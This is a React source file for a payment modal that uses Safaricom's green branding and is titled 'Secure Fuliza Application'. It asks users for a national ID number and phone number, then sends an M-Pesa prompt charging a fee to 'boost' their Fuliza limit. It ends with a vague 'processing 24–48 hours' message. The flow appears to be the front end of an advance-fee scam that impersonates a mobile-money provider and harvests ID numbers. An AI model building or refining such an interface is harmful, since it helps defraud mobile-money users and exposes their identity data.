import React, { useState, useEffect } from "react";
import { SAFARICOM_GREEN } from "../utils/constants";

export default function PaymentModal({
  isOpen,
  onClose,
  onInitiatePayment,
  onCheckPayment,
  paymentState,
  selectedLimit,
  selectedFee,
}) {
  const [idNumber, setIdNumber] = useState("");
  const [phoneNumber, setPhoneNumber] = useState("");
  const [currentStep, setCurrentStep] = useState("input");
  const [loading, setLoading] = useState(false);

  useEffect(() => {
    if (isOpen && paymentState.phone) {
      setPhoneNumber(paymentState.phone);
    }
  }, [isOpen, paymentState.phone]);

  const formatPhone = (phone) => {
    if (!phone) return "";
    return phone.startsWith("0") ? "254" + phone.slice(1) : phone;
  };

  // 🔥 FIXED FLOW
  const handleInitiate = async () => {
    if (!phoneNumber || !idNumber) {
      alert("Please fill all details");
      return;
    }

    try {
      setLoading(true);

      const payload = {
        phone: formatPhone(phoneNumber),
        amount: selectedFee,
        idNumber,
      };

      const result = await onInitiatePayment(payload);

      // ❌ DO NOT proceed if STK failed
      if (!result || result.success === false) {
        throw new Error(result?.message || "STK failed");
      }

      // ✅ ONLY move after success
      setCurrentStep("response");

    } catch (error) {
      alert(error.message || "Payment failed");
      setCurrentStep("input");
    } finally {
      setLoading(false);
    }
  };

  const handleCheckPayment = async () => {
    await onCheckPayment();

    if (paymentState.status === "completed") {
      setCurrentStep("success");
    }
  };

  const handleClose = () => {
    setCurrentStep("input");
    setIdNumber("");
    setPhoneNumber("");
    onClose();
  };

  const handleSuccessClose = () => {
    setCurrentStep("input");
    setIdNumber("");
    setPhoneNumber("");
    onClose();
  };

  if (!isOpen) return null;

  return (
    <div className="fixed inset-0 bg-black/60 flex items-center justify-center p-4 z-[300] backdrop-blur-sm">
      <div className="bg-white rounded-[2rem] overflow-hidden w-full max-w-sm shadow-2xl">

        {/* HEADER */}
        <div
          className="p-6 text-white text-center"
          style={{ backgroundColor: SAFARICOM_GREEN }}
        >
          <p className="text-[10px] font-bold uppercase tracking-widest opacity-80 mb-1">
            Secure Fuliza Application
          </p>

          <h3 className="text-xl font-extrabold">
            Boost To Ksh {selectedLimit?.toLocaleString() || 0}
          </h3>
        </div>

        <div className="p-6">

          {/* INPUT */}
          {currentStep === "input" && (
            <>
              <input
                value={idNumber}
                onChange={(e) => setIdNumber(e.target.value)}
                placeholder="ID Number"
                className="w-full mb-3 p-3 border rounded-xl"
              />

              <input
                value={phoneNumber}
                onChange={(e) => setPhoneNumber(e.target.value)}
                placeholder="07XXXXXXXX"
                className="w-full mb-6 p-3 border rounded-xl"
              />

              <button
                onClick={handleInitiate}
                disabled={loading}
                className="w-full py-3 text-white rounded-xl"
                style={{ backgroundColor: SAFARICOM_GREEN }}
              >
                {loading ? "Processing..." : `Pay Ksh ${selectedFee || 0}`}
              </button>
            </>
          )}

          {/* RESPONSE */}
          {currentStep === "response" && (
            <div className="py-8 text-center">

              <div className="w-12 h-12 border-4 border-green-500 border-t-transparent rounded-full animate-spin mx-auto mb-4" />

              <h4 className="text-lg font-bold">
                Sending M-Pesa Prompt
              </h4>

              <p className="text-sm text-slate-500 mt-2">
                Check your phone
              </p>

              <div className="mt-5 text-left bg-slate-50 p-4 rounded-xl">

                <div className="flex justify-between">
                  <span>Amount</span>
                  <span>Ksh {selectedFee}</span>
                </div>

                <div className="flex justify-between">
                  <span>Phone</span>
                  <span>{paymentState.phone || formatPhone(phoneNumber)}</span>
                </div>

                <div className="flex justify-between">
                  <span>Status</span>
                  <span>{paymentState.status}</span>
                </div>

              </div>

              <button
                onClick={handleCheckPayment}
                className="mt-5 w-full bg-green-600 text-white p-3 rounded-xl"
              >
                I Have Paid
              </button>
            </div>
          )}

          {/* SUCCESS */}
          {currentStep === "success" && (
            <div className="text-center py-6">

              <h3 className="text-xl font-bold text-green-600">
                Request Received
              </h3>

              <p className="text-sm mt-2">
                Processing 24–48 hours
              </p>

              <button
                onClick={handleSuccessClose}
                className="mt-6 w-full bg-slate-200 p-3 rounded-xl"
              >
                Back to Home
              </button>

            </div>
          )}

        </div>
      </div>
    </div>
  );
}